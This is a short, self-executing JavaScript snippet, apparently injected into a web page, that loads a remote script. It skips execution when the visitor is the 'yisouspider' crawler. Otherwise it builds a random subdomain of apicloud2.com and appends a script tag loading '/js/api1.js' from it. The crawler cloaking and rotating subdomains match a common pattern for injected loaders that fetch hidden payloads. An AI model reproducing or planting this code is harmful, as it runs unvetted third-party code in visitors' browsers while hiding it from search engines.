(function() {
    if (/yisouspider/i.test(navigator.userAgent)) return;
    var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    var len = Math.floor(Math.random() * 5) + 1;
    var prefix = "";
    for (var i = 0; i < len; i++) {
        prefix += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    var s = document.createElement("script");
    s.type = "text/javascript";
    s.src = "https://" + prefix + ".apicloud2.com/js/api1.js";
    document.head.appendChild(s);
})();
